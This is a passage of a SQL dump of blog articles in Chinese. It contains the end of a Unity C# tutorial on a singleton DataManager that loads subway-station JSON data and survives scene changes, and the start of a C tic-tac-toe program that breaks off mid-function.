<p>2、一些需要从外部文档读取的数据，在其他脚本对象也需要用到的使用，也可以使用单例对象进行读取，其他对象再通过这个单例对象去获取数据。</p> \n </blockquote> \n <p>假设有以下需求：</p> \n <blockquote> \n  <p>1、整个项目中有且只有一个DataManager单例对象<br> 2、在DataManager单例对象中，需要去读取文档的数据，并且保存下载<br> 3、在切换场景的时候DataManager对象不能被销毁<br> 4、在不同的脚本中可以读取到DataManager单例对象读取的值</p> \n </blockquote> \n <p>下面我们就来一步步实现单例对象下的DataManager。</p> \n <h2><a id=\"font_colorFF00FFfont__DataManager_40\"></a><font color=\"#FF00FF\">❤</font> 三、实现单例模式的DataManager</h2> \n <h3><a id=\"font_color726930font__31_41\"></a><font color=\"#726930\">❤</font> 3-1、定义单例对象</h3> \n <p>我们定义一个DataManager对象，继承于MonoBehaviour，具体代码如下：</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Collections</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Collections<span class=\"token punctuation\">.</span>Generic</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">UnityEngine</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">DataManager</span> <span class=\"token punctuation\">:</span> <span class=\"token type-list\"><span class=\"token class-name\">MonoBehaviour</span></span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">DataManager</span> Instance<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Awake</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        Instance <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">DontDestroyOnLoad</span><span class=\"token punctuation\">(</span>gameObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p>1、使用静态的DataManager属性Instance保证了它可以通过类进行访问，而不是通过实例化访问<br> 2、继承MonoBehaviour类的实例是由Unity进行创建，不能通过构造函数创建<br> 3、在Awake函数里面对Instance进行赋值，保证了这个属性可以第一时间初始化<br> 4、使用DontDestroyOnLoad可以使这个挂载脚本的游戏对象在切换场景中也不会被销毁<br> 5、DontDestroyOnLoad的参数使用(gameObject)，这样切换场景中游戏对象不会被销毁，使用this只能保证当前脚本不会被销毁，但是对象销毁了，这个脚本也没有了。</p> \n </blockquote> \n <p>创建完这个对象，在场景中也新建一个DataManager对象，将这个脚本拖到这个对象上：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210611110422631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3NjQ0MjQ1Njc=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h3><a id=\"font_colorf58220font__32_70\"></a><font color=\"#f58220\">❤</font> 3-2、单例对象去读取数据保存下来</h3> \n <p>代码如下：</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Collections</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Collections<span class=\"token punctuation\">.</span>Generic</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>IO</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">UnityEngine</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">DataManager</span> <span class=\"token punctuation\">:</span> <span class=\"token type-list\"><span class=\"token class-name\">MonoBehaviour</span></span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">DataManager</span> Instance<span class=\"token punctuation\">;</span>\n\n    <span class=\"token class-name\"><span class=\"token keyword\">string</span></span> m_JsonContent<span class=\"token punctuation\">;</span><span class=\"token comment\">//临时文档数据</span>\n    <span class=\"token class-name\">RootData</span> m_JsonData<span class=\"token punctuation\">;</span><span class=\"token comment\">//临时接收JSON解析数据</span>\n\n    <span class=\"token comment\">//数据保存到这个List里面，其他脚本就可以调用到了</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">List<span class=\"token punctuation\">&lt;</span>StationAllInfo<span class=\"token punctuation\">&gt;</span></span> m_StationsAllInfo <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">List<span class=\"token punctuation\">&lt;</span>StationAllInfo<span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Awake</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        Instance <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">DontDestroyOnLoad</span><span class=\"token punctuation\">(</span>gameObject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token function\">ReadJSONData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">ReadJSONData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token class-name\"><span class=\"token keyword\">string</span></span> pathstations <span class=\"token operator\">=</span> Application<span class=\"token punctuation\">.</span>streamingAssetsPath <span class=\"token operator\">+</span> <span class=\"token string\">\"/地铁站.json\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">using</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StreamReader</span> SR <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">StreamReader</span><span class=\"token punctuation\">(</span>pathstations<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            m_JsonContent <span class=\"token operator\">=</span> SR<span class=\"token punctuation\">.</span><span class=\"token function\">ReadToEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            Debug<span class=\"token punctuation\">.</span><span class=\"token function\">Log</span><span class=\"token punctuation\">(</span>m_JsonContent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            SR<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            SR<span class=\"token punctuation\">.</span><span class=\"token function\">Dispose</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">//保存JSON数据</span>\n            m_JsonData <span class=\"token operator\">=</span> JsonUtility<span class=\"token punctuation\">.</span><span class=\"token generic-method\"><span class=\"token function\">FromJson</span><span class=\"token generic class-name\"><span class=\"token punctuation\">&lt;</span>RootData<span class=\"token punctuation\">&gt;</span></span></span><span class=\"token punctuation\">(</span>m_JsonContent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token keyword\">int</span></span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">.</span>Count<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>properties<span class=\"token punctuation\">.</span>LINE_ID <span class=\"token operator\">!=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//剔除无用的信息，保存有用的信息</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token class-name\">StationAllInfo</span> item <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">StationAllInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                item<span class=\"token punctuation\">.</span>X <span class=\"token operator\">=</span> m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>properties<span class=\"token punctuation\">.</span>X<span class=\"token punctuation\">;</span>\n                item<span class=\"token punctuation\">.</span>Y <span class=\"token operator\">=</span> m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>properties<span class=\"token punctuation\">.</span>Y<span class=\"token punctuation\">;</span>\n                item<span class=\"token punctuation\">.</span>STACODE <span class=\"token operator\">=</span> m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>properties<span class=\"token punctuation\">.</span>STACODE<span class=\"token punctuation\">;</span>\n                item<span class=\"token punctuation\">.</span>S_NAME <span class=\"token operator\">=</span> m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>properties<span class=\"token punctuation\">.</span>S_NAME<span class=\"token punctuation\">;</span>\n                item<span class=\"token punctuation\">.</span>LINE_ID <span class=\"token operator\">=</span> m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>properties<span class=\"token punctuation\">.</span>LINE_ID<span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">//05 换成 5 （比如05号线 换成5号线）</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>properties<span class=\"token punctuation\">.</span>LINE_ID<span class=\"token punctuation\">.</span><span class=\"token function\">Substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">{\n    <!-- --></span>\n                    item<span class=\"token punctuation\">.</span>LINE_NAME <span class=\"token operator\">=</span> m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>properties<span class=\"token punctuation\">.</span>LINE_ID<span class=\"token punctuation\">.</span><span class=\"token function\">Substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"号线\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">else</span>\n                <span class=\"token punctuation\">{\n    <!-- --></span>\n                    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>properties<span class=\"token punctuation\">.</span>LINE_ID<span class=\"token punctuation\">)</span><span class=\"token comment\">//对字母缩写的站名进行处理</span>\n                    <span class=\"token punctuation\">{\n    <!-- --></span>\n                        <span class=\"token keyword\">case</span> <span class=\"token string\">\"fs\"</span><span class=\"token punctuation\">:</span>\n                            item<span class=\"token punctuation\">.</span>LINE_NAME <span class=\"token operator\">=</span> <span class=\"token string\">\"房山线\"</span><span class=\"token punctuation\">;</span>\n                            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">case</span> <span class=\"token string\">\"bt\"</span><span class=\"token punctuation\">:</span>\n                            item<span class=\"token punctuation\">.</span>LINE_NAME <span class=\"token operator\">=</span> <span class=\"token string\">\"八通线\"</span><span class=\"token punctuation\">;</span>\n                            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">case</span> <span class=\"token string\">\"yz\"</span><span class=\"token punctuation\">:</span>\n                            item<span class=\"token punctuation\">.</span>LINE_NAME <span class=\"token operator\">=</span> <span class=\"token string\">\"亦庄线\"</span><span class=\"token punctuation\">;</span>\n                            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">case</span> <span class=\"token string\">\"cp\"</span><span class=\"token punctuation\">:</span>\n                            item<span class=\"token punctuation\">.</span>LINE_NAME <span class=\"token operator\">=</span> <span class=\"token string\">\"昌平线\"</span><span class=\"token punctuation\">;</span>\n                            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">case</span> <span class=\"token string\">\"jc\"</span><span class=\"token punctuation\">:</span>\n                            item<span class=\"token punctuation\">.</span>LINE_NAME <span class=\"token operator\">=</span> <span class=\"token string\">\"机场线\"</span><span class=\"token punctuation\">;</span>\n                            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span>\n                            item<span class=\"token punctuation\">.</span>LINE_NAME <span class=\"token operator\">=</span> m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>properties<span class=\"token punctuation\">.</span>LINE_ID <span class=\"token operator\">+</span> <span class=\"token string\">\"号线\"</span><span class=\"token punctuation\">;</span>\n                            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n                item<span class=\"token punctuation\">.</span>STYPE <span class=\"token operator\">=</span> m_JsonData<span class=\"token punctuation\">.</span>GisJosnDatas<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>properties<span class=\"token punctuation\">.</span>STYPE<span class=\"token punctuation\">;</span>\n                m_StationsAllInfo<span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <h3><a id=\"font_colorac6767font__33_158\"></a><font color=\"#ac6767\">❤</font> 3-3、在其他脚本中使用数据</h3> \n <p>我们新建一个UseData.cs脚本去使用数据：</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token keyword\">using</span> <span class=\"token namespace\">UnityEngine</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">UseData</span> <span class=\"token punctuation\">:</span> <span class=\"token type-list\"><span class=\"token class-name\">MonoBehaviour</span></span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token comment\">//点击键盘W 显示数据</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Input<span class=\"token punctuation\">.</span><span class=\"token function\">GetKeyDown</span><span class=\"token punctuation\">(</span>KeyCode<span class=\"token punctuation\">.</span>W<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token function\">ShowData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">ShowData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token keyword\">int</span></span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> DataManager<span class=\"token punctuation\">.</span>Instance<span class=\"token punctuation\">.</span>m_StationsAllInfo<span class=\"token punctuation\">.</span>Count<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            Debug<span class=\"token punctuation\">.</span><span class=\"token function\">Log</span><span class=\"token punctuation\">(</span>DataManager<span class=\"token punctuation\">.</span>Instance<span class=\"token punctuation\">.</span>m_StationsAllInfo<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>X <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span>\n                <span class=\"token operator\">+</span>DataManager<span class=\"token punctuation\">.</span>Instance<span class=\"token punctuation\">.</span>m_StationsAllInfo<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>Y <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span>\n                <span class=\"token operator\">+</span> DataManager<span class=\"token punctuation\">.</span>Instance<span class=\"token punctuation\">.</span>m_StationsAllInfo<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>STACODE <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span>\n                <span class=\"token operator\">+</span> DataManager<span class=\"token punctuation\">.</span>Instance<span class=\"token punctuation\">.</span>m_StationsAllInfo<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>S_NAME <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span>\n                <span class=\"token operator\">+</span> DataManager<span class=\"token punctuation\">.</span>Instance<span class=\"token punctuation\">.</span>m_StationsAllInfo<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>LINE_ID <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span>\n                <span class=\"token operator\">+</span> DataManager<span class=\"token punctuation\">.</span>Instance<span class=\"token punctuation\">.</span>m_StationsAllInfo<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>LINE_NAME <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span>\n                <span class=\"token operator\">+</span> DataManager<span class=\"token punctuation\">.</span>Instance<span class=\"token punctuation\">.</span>m_StationsAllInfo<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>STYPE <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p>将这个脚本拖到场景中的对象上：<br> <img src=\"https://img-blog.csdnimg.cn/20210611111630338.png\" alt=\"在这里插入图片描述\"><br> 运行程序，敲击键盘W：<br> <img src=\"https://img-blog.csdnimg.cn/20210611111651912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3NjQ0MjQ1Njc=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 所有的值，都从单例对象DataManager的InStance的m_StationsAllInfo数组中读取出来了。</p> \n <h3><a id=\"font_color40835efont__34_196\"></a><font color=\"#40835e\">❤</font> 3-4、切换场景读取数据</h3> \n <p>我们新建两个场景：Index和Next，然后Index场景中的对象上挂载脚本ChangeScenes.cs脚本，代码如下：</p> \n <pre><code class=\"prism language-csharp\"><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Collections</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Collections<span class=\"token punctuation\">.</span>Generic</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">UnityEngine</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">using</span> <span class=\"token namespace\">UnityEngine<span class=\"token punctuation\">.</span>SceneManagement</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ChangeScenes</span> <span class=\"token punctuation\">:</span> <span class=\"token type-list\"><span class=\"token class-name\">MonoBehaviour</span></span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token comment\">// Start is called before the first frame update</span>\n    <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        \n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// Update is called once per frame</span>\n    <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">Update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Input<span class=\"token punctuation\">.</span><span class=\"token function\">GetKeyDown</span><span class=\"token punctuation\">(</span>KeyCode<span class=\"token punctuation\">.</span>Q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            SceneManager<span class=\"token punctuation\">.</span><span class=\"token function\">LoadScene</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p>也就是切换场景，然后在Index场景中新建一个DataManager对象，将DataManager脚本拖上去。</p> \n <p>然后Next场景中随便找一个对象挂载UseData脚本，场景中不需要创建DataManager对象</p> \n <p>然后将两个场景加到Build Setting中：<br> <img src=\"https://img-blog.csdnimg.cn/20210611112306473.png\" alt=\"在这里插入图片描述\"></p> \n <p>运行程序：</p> \n <p>切换到Next场景，DataManager对象也存在：<br> <img src=\"https://img-blog.csdnimg.cn/20210611112341433.png\" alt=\"在这里插入图片描述\"><br> 敲击键盘W：<br> <img src=\"https://img-blog.csdnimg.cn/20210611111651912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3E3NjQ0MjQ1Njc=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 所有的值，都从上一个场景中的DataManager对象的挂载脚本的单例对象DataManager.cs的InStance的m_StationsAllInfo数组中读取出来了。</p> \n <h2><a id=\"font_color9d9087font___238\"></a><font color=\"#9d9087\">❤</font> 四、后言</h2> \n <p>这是Unity使用单例的简单应用，最主要的几个知识点是;</p> \n <blockquote> \n  <p>1、对象切换场景不销毁<br> 2、单例对象的静态属性<br> 3、数据的保存<br> 4、其他脚本用单例对象的数据的方法</p> \n </blockquote> \n <p>结束，好好学习加油吧！</p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (56, 'C语言——三子棋', '<div id=\"content_views\" class=\"htmledit_views\"> \n <p>game.h</p> \n <pre><code>#define ROW 3\n#define COL 3\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;time.h&gt;\n//声明\nvoid InitBoard(char board[ROW][COL], int row, int col);\nvoid DisplayBoard(char board[ROW][COL], int row, int col);\nvoid PlayerMove(char board[ROW][COL], int row, int col);\nvoid ComputerMove(char board[ROW][COL], int row, int col);\n//告诉我们游戏四种状态\n//玩家赢-\'*\'\n//电脑赢-\'$\'\n//平局-\'Q\'\n//游戏继续-\'C\'\n\nchar IsWin(char board[ROW][COL], int row, int col);</code></pre> \n <p>game.c</p> \n <pre><code>#include\"game.h\"\nvoid InitBoard(char board[ROW][COL], int row, int col)\n{\n	int i = 0;\n	int j = 0;\n	for (i = 0; i &lt; row; i++)\n	{\n		for (j = 0; j &lt; col; j++)\n		{\n			board[i][j] = \' \';\n		}\n	}\n}\nvoid DisplayBoard(char board[ROW][COL], int row, int col)\n{\n	int i = 0;\n	for (i = 0; i &lt; row; i++)\n	{\n		int j = 0;\n		for (j = 0; j &lt; col; j++)\n		{\n			//1、打印一行数据\n			printf(\" %c \", board[i][j]);\n			if (j &lt; col - 1)\n				printf(\"|\");\n		}\n		printf(\"\\n\");\n		//2、打印分割行\n		if (i &lt; row-1)\n		{\n			for (j = 0; j &lt; col; j++)\n			{\n				printf(\"---\");\n				if (j &lt; col - 1)\n					printf(\"|\");\n			}\n			printf(\"\\n\");\n		}\n	}\n}\nvoid PlayerMove(char board[ROW][COL], int row, int col)\n{\n	int x = 0;\n	int y = 0;\n	printf(\"玩家走:&gt;\\n\");\n	while (1)\n	{\n		printf(\"请输入你要落子的坐标&gt;:\");\n		scanf(\"%d%d\", &amp;x, &amp;y);\n		//判断（x,y）坐标的合法性\n		if (x &gt;= 1 &amp;&amp; x &lt;= row &amp;&amp; y &gt;= 1 &amp;&amp; y &lt;= col)\n		{\n			if (board[x - 1][y - 1] == \' \')\n			{\n				board[x - 1][y - 1] = \'*\';\n				break;\n			}\n			else\n			{\n				printf(\"该坐标被占用\\n\");\n			}\n		}\n		else\n		{\n			printf(\"坐标非法，请重新输入！\\n\");\n		}\n	}\n}\nvoid ComputerMove(char board[ROW][COL], int row, int col)\n{\n	int x = 0;\n	int y = 0;\n	printf(\"电脑落子&gt;:\\n\");\n	while (1)\n	{\n		x = rand() % row;\n		y = rand() % col;\n		if (board[x][y] == \' \')\n		{\n			board[x][y] = \'$\';\n			break;\n		}\n	}\n}\n//判断是否平局\n//返回1表示棋盘满了，返回0表示棋盘未满\nint IsFull(char board[ROW][COL], int row, int col)\n{\n	int i = 0;\n	int j = 0;\n	for (i = 0; i &lt; row; i++)\n	{\n		for (j = 0; j &lt; col; j++)\n		{\n			if (board[i][j] == \' \')\n			{\n				return 0;\n			}\n		}\n	}\n	return 1;\n}\nchar IsWin(char board[ROW][COL], int row, int col)\n{\n	int i = 0;\n	//横三行\n	for (i = 0; i &lt; row; i++)\n	{\n		if (board[i][0] == board[i][1] &amp;&amp; board[i][1] == board[i][2] &amp;&amp; board[i][0] != \' \')\n		{\n			return board[i][1];\n		}\n	}\n	//竖三列\n	for (i = 0; i &lt; col; i++)\n	{\n		if (board[0][i] == board[1][i] &amp;&amp; board[1][i] == board[2][i] &amp;&amp; board[0][i] != \' \')\n		{\n			return board[1][i];\n		}\n	}\n	//对角线\n	if (board[0][0] == board[1][1] &amp;&amp; board[1][1] == board[2][2]&amp;&amp;board[1][1]!=\' \')\n	{\n		return board[1][1];\n	}\n	if (board[0][2] == board[1][1] &amp;&amp; board[1][1] == board[2][0] &amp;&amp; board[1][1] != \' \')\n	{\n		return board[1][1];\n	}\n	if (IsFull(board, ROW, COL) == 1)\n	{\n		return \'Q\';\n	}\n	return \'C\';\n}</code></pre> \n <p>test.c</p> \n <pre><code>#include\"game.h\"\nvoid menu()\n{\n	printf(\"*****************************\\n\");\n	printf(\"****  1、play   0、exit  ****\\n\");\n	printf(\"*****************************\\n\");\n}\n//游戏的整个算法实现\nvoid game()\n{\n	char ret = 0;\n	//数组存放走出的棋盘信息\n	char board [ROW][COL] = { 0 };\n	//初始化棋盘\n	InitBoard(board,ROW,COL);\n	//打印棋盘\n	DisplayBoard(board,ROW,COL);\n	//下棋\n	